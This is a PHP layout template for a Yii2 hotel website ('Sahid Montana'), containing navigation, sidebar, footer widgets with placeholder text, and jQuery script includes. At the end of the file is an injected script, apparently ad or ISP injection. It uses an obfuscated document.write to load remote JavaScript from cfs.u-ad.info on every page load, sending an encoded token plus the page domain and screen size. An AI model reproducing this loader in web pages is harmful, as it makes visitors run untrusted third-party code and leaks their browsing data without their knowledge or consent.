<?php

use yii\helpers\Html;
use frontend\assets\AppAsset;

$session = Yii::$app->session;

AppAsset::register($this);

$this->beginPage();
?>
<!DOCTYPE html>
<html> 
    <head>
        <meta charset=utf-8>
        <title><?= Html::encode($this->title) ?></title>
        <meta name=description content="Sahid Montana Hotel">
        <meta name=keywords content=Responsive,HTML5,CSS3,XML,JavaScript>
        <meta name=author content="Joseph a, ravistheme@gmail.com"><!-- End of Meta tags -->
        <link href="http://fonts.googleapis.com/css?family=Droid+Sans:400,700%7cDroid+Serif:400,700,400italic,700italic%7cYellowtail%7cGreat+Vibes" rel=stylesheet type=text/css>
        <link rel=stylesheet id=main-style-file type=text/css href=<?= Yii::$app->homeUrl ?>css/styles.css>
        <link type="text/css" rel='stylesheet' href="<?= Yii::$app->homeUrl ?>css/styles.css">
    </head>
    <body class="inner-page shortcodes">
        <div class=main-wrapper>
            <div id=main-header-top> 
                <div position="center" class="main-header-top-container container">
                    <center> 
                        <div id=top-logo data-logo-letter=>
                            <a href=#><span class="s">Sahid</span><span class="m">Montana</span>
                                <span class=five-stars>
                                    <i class="fa fa-star"></i> 
                                    <i class="fa fa-star"></i> 
                                    <i class="fa fa-star"></i> 

                                </span>
                            </a>
                        </div>
                    </center> 
                </div>
            </div>
        </div>

        <header id=main-header>
            <div class="header-content container"> 
                <div class=menu-container>
                    <nav id=main-menu> 
                        <ul class=main-menu> 
                            <li><a href="<?= Yii::$app->urlManager->createUrl('site/index') ?>">Home</a></li>
                            <li><a href="<?= Yii::$app->urlManager->createUrl('article/news') ?>">News & Event</a></li> 
                            <li><a href="<?= Yii::$app->urlManager->createUrl('article/promotion') ?>">Promotion</a></li> 
                            <li class=margin-right><a href="<?= Yii::$app->urlManager->createUrl('article/room') ?>">Room</a></li> 
                            <li class=margin-left><a href="<?= Yii::$app->urlManager->createUrl('site/gallery') ?>">Gallery</a></li> 
                            <li class=has-sub-menu><a href=#>Facility</a> 
                                <ul> 
                                    <li><a href="<?= Yii::$app->urlManager->createUrl('article/restaurant') ?>">Restaurant</a></li>
                                    <li><a href="<?= Yii::$app->urlManager->createUrl('article/meeting-room') ?>">Meeting room</a></li>
                                </ul> 
                            </li> 
                            <li class=has-sub-menu>
                                <a href=#>Sahid Group</a>
                                <ul>
                                    <li><a href="pages/jatim.html">East Java</a></li>
                                    <li><a href="pages/jateng.html">Central Java</a></li>
                                    <li><a href="pages/jabar.html">West Java</a></li>
                                    <li><a href="pages/sumatera.html">Sumatera</a></li>
                                    <li><a href="pages/jakarta.html">Jakarta</a></li>
                                    <li><a href="pages/lombok.html">Lombok</a></li>
                                    <li><a href="pages/sulawesi.html">Sulawesi</a></li>
                                </ul>
                            </li>
                            <li><a href="<?= Yii::$app->urlManager->createUrl('site/contact') ?>">Contact</a></li>
                        </ul>
                    </nav>
                    <div id=main-menu-handle>
                        <span></span>
                    </div>
                </div> 
            </div>
        </header>
        <section id="internal-title" class="container" data-background="parallax" style="background-attachment: fixed; background-position: 50% 12px;"> 
            <h1>Single Post</h1>
            <ol class="breadcrumb">
                <li><a href="../index.html">Home</a></li> 
                <li><a href="#">Blog</a></li> 
                <li class="active">Single Post</li> 
            </ol> 
        </section>
        <div id="post-pages" class="container padding-bottom"> 
            <section id="single-post" class="col-md-9">
                <?= $content ?>
            </section>
            <aside class="col-md-3">
                <div class="side-boxes"> 
                    <h3 class="side-title">Archive</h3>
                    <div class="side-contents"> 
                        <ul> 
                            <li><a href="#">Typography</a></li> 
                            <li><a href="#">Columns</a></li> 
                            <li><a href="#">Elements</a></li> 
                            <li><a href="#">Timeline</a></li> 
                            <li><a href="#">Staff boxes</a></li> 
                            <li><a href="#">Breadcrumb &amp; Alerts</a></li> 
                        </ul> 
                    </div> 
                </div> 
                <div class="side-boxes">
                    <h3 class="side-title">Tags</h3>
                    <div class="side-contents">
                        <a href="#" class="tags btn primary-colored">Restaurant</a>
                        <a href="#" class="tags btn primary-colored">Sauna</a>
                        <a href="#" class="tags btn primary-colored">Jacuzzi</a>
                        <a href="#" class="tags btn primary-colored">Spa</a>
                        <a href="#" class="tags btn primary-colored">Foods</a>
                        <a href="#" class="tags btn primary-colored">Sunbathing</a>
                        <a href="#" class="tags btn primary-colored">Drinks</a>
                        <a href="#" class="tags btn primary-colored">beach</a>
                    </div>
                </div>
            </aside>
        </div>
        <footer id=top-footer> 
            <div id=top-footer-content class=container>
                <div class="widget col-md-3">
                    <h4>Text Widget</h4>
                    <div class="content-box row"> 
                        <div class=widget-content>
                            <p> Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia modi at, rem quaerat et, voluptatibus esse quis earum itaque nesciunt, ullam fugiat error rerum amet quisquam minus aliquid est temporibus. </p> <!-- Footer Social icons --> 
                            <div class=social-icons> 
                                <a href=# class=facebook></a>
                                <a href=# class=twitter></a>
                                <a href=# class=google-plus></a>
                            </div> 
                        </div>
                    </div> 
                </div> 
                <div class="widget col-md-3">
                    <h4>Recent Posts</h4>
                    <div class="content-box row"> 
                        <div class=widget-content>
                            <ul> 
                                <li>
                                    <a href=pages/single-post.html>
                                        <img src=<?= Yii::$app->homeUrl ?>img/blog/1.jpg alt="post 1" class=post-img></a>
                                    <a href=pages/single-post.html class=post-title>Sunbathing in beautiful beach</a> 
                                    <div class=date>May 28, 2014</div> 
                                </li> 
                                <li> 
                                    <a href=pages/single-post.html>
                                        <img src=<?= Yii::$app->homeUrl ?>img/blog/2.jpg alt="post 1" class=post-img></a>
                                    <a href=pages/single-post.html class=post-title>Sauna / Jacuzzi / Spa</a> 
                                    <div class=date>Feb 18, 2014</div> 
                                </li> 
                                <li> 
                                    <a href=pages/single-post.html>
                                        <img src=<?= Yii::$app->homeUrl ?>img/blog/3.jpg alt="post 1" class=post-img></a>
                                    <a href=pages/single-post.html class=post-title>International foods in Yoona Restaurants</a> 
                                    <div class=date>Jan 20, 2014</div> 
                                </li> 
                            </ul> 
                        </div>
                    </div>
                </div> 
                <div class="widget col-md-3">
                    <h4>Tags</h4>
                    <div class="content-box row"> 
                        <div class=widget-content>
                            <a href=# class="tags btn colored">Restaurant</a>
                            <a href=# class="tags btn colored">Sauna</a> 
                            <a href=# class="tags btn colored">Jacuzzi</a> 
                            <a href=# class="tags btn colored">Spa</a> 
                            <a href=# class="tags btn colored">Foods</a> 
                            <a href=# class="tags btn colored">Sunbathing</a> 
                            <a href=# class="tags btn colored">Drinks</a> 
                            <a href=# class="tags btn colored">beach</a> 
                        </div> </div> 
                </div> 
                <div class="widget col-md-3">
                    <h4>Newsletter Subscribe</h4>
                    <div class="content-box row"> 
                        <div class=widget-content>
                            <p> Lorem ipsum dolor sit amet, consectetur adipisicing elit. Itaque labore, at reiciendis officiis. </p> 
                            <form class="sign-up-form clearfix" action=#> 
                                <div class=fields> 
                                    <input placeholder=Email type=email>
                                </div> 
                                <div class=button-container>
                                    <input class="btn colored" value="Sign Up Now" type=submit></div> 
                            </form> 
                        </div> 
                    </div> 
                </div>
            </div> 
        </footer> 
        <footer id=footer>
            <div id=go-up></div>
            <ul class="footer-menu container"> 
                <li><a href=#>Home</a></li> 
                <li><a href=pages/rooms.html>Rooms</a></li> 
                <li><a href=pages/about.html>News & Events</a></li> 
                <li><a href=#>Promotion</a></li> 
                <li><a href=pages/contact.html>Rooms</a></li>
                <li><a href=pages/about.html>Gallery</a></li> 
                <li><a href=#>Facility</a></li> 
                <li><a href=pages/contact.html>Contact</a></li>
            </ul> 
            <div class=copyright> &copy; 2014 Yoona. All Rights Reserved. </div> 
        </footer> 
    </div> 
    <!-- JS Includes --> <!-- Essential JS files ( DO NOT REMOVE THEM ) --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery-1.11.1.min.js></script> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.modernizr.min.js></script> 
    <!-- Include bootstrap tab scrip --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/bootstrap/tab.js></script> 
    <!-- Include required js files --> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.bxslider.min.js></script> 
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/owl.carousel.min.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/jquery.magnific-popup.min.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/helper.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/init.js></script>
    <script type=text/javascript src=<?= Yii::$app->homeUrl ?>js/template.js></script>
    <script type=text/javascript>
        jQuery(document).ready(function() {
            "use strict";
            /* Load Properties */
            jQuery("#roomLoader-container").slideUp();
            jQuery(".property-boxes .more-detail").click(function(e) {
                e.preventDefault();
                jQuery("#roomLoader").addClass('loading');
                var roomID = jQuery(this).attr('data-room-id');
                jQuery.ajax('rooms/luxury/' + roomID + '.html')
                        .done(function(data) {
                            jQuery("#roomLoader").addClass('active').removeClass('loading');
                            jQuery("#roomLoader-container").html(data).slideDown(500, jQuery.internal_custom_bxslider);
                        });
                jQuery('body,html').animate({
                    scrollTop: jQuery(jQuery.attr(this, 'href')).offset().top - 60
                }, 1000);
            });
            // Close the Property Loader box
            jQuery('#roomLoader .close-icon').click(function() {
                jQuery("#roomLoader").removeClass('active');
                jQuery("#roomLoader-container").slideUp().html('');
            });
        });
    </script> <!-- End of JS Includes --> 
    <script type="text/javascript">
        if (self == top) {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request");
            document.write("?id=1");
            document.write("&amp;enc=telkom2");
            document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR%2fVeDMuDxgFsCFjIEn2Hw7b0sb9LUjJl4y%2bIANt8ZtVR%2bYCp36c4Bsfos88lI60avfhyHxJH9%2fhA4nvKf4t48mE9u3WoRsIuwHeZn1ZNpeMt6uPdObKwNRGg7vVk5K3p8%2bcAUtCD3e5zfANssRPbJvACW3AnYVw65IuFjvZcPnQoLegD22%2fNMGOlM59dhtHLoJBkROMBxlLV%2bJ9vu%2fZyzos67Nmkcr6QLqp50k45ZzzA5TCjTTFJSQdm1ry3Bz9mbZcusC0%2bXd12QBV7YRoqIZOrBhcv1S5wmgtX3kgAsUa6QiGb3bk42q93EtO%2ffuC6QMb9iXxCR%2fPKr4kh5NGGx2etQ%2b6QDyDl8TJHaZs8NnvYa7UQim9PlYk%2buFvG5o6b%2fgoD4s8B69uXhDdN3cHBF%2b6Vi8QoLtH1TI0Hm00O5QCzt9P10on70A1vjQLLWH%2bIevKLKCB%2f5SLE%3d");
            document.write("&amp;idc_r=" + idc_glo_r);
            document.write("&amp;domain=" + document.domain);
            document.write("&amp;sw=" + screen.width + "&amp;sh=" + screen.height);
            document.write("></scr" + "ipt>");
        }
    </script>
</body> 
</html>